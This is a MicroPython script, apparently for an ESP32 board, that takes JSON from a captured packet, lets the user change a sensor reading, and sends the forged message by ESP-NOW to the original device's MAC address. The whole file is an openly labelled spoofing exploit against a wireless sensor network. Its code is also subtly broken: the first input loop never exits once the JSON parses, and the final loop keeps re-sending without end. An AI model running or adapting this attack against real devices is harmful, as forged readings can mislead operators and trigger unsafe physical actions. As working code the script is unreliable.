import ujson
print('Paste JSON extracted from captured packet')

while True:
    try:
        captured_json = ujson.loads(input())
    except:
        print("Message is not JSON")
        
print(f"Found sensors: {captured_json['sensor']}")
print("Type sensor name to change its value: ")
sensor_index = None

while True:
    sensor = input()
    try:
        sensor_index = captured_json['sensor'].index(sensor)
        break
    except:
        print("Incorrect sensor name")

print(f"Type new value of sensor {captured_json['sensor'][sensor_index]} :")
sensor_value = None

while True:
    sensor_value = input()
    if sensor_value.isdigit():
       break
    else:
        print("Incorrect value")

captured_json['sensor_value'][sensor_index] = sensor_value

import network
import espnow
import time

exploit_message = ujson.dumps(captured_json)
mac = captured_json['Address'].replace(':', '')
peer = bytes.fromhex(mac)
sta = network.WLAN(network.STA_IF)
sta.active(True)
e = espnow.ESPNow()
e.active(True)
e.add_peer(peer)

print("Type WiFi channel number: ")
while True:
    channel = input()
    try:
        sta.config(channel=int(channel))
        e.send(peer, exploit_message, True)
        time.sleep_ms(100)
    except:
        print("Wrong channel, try again: ")
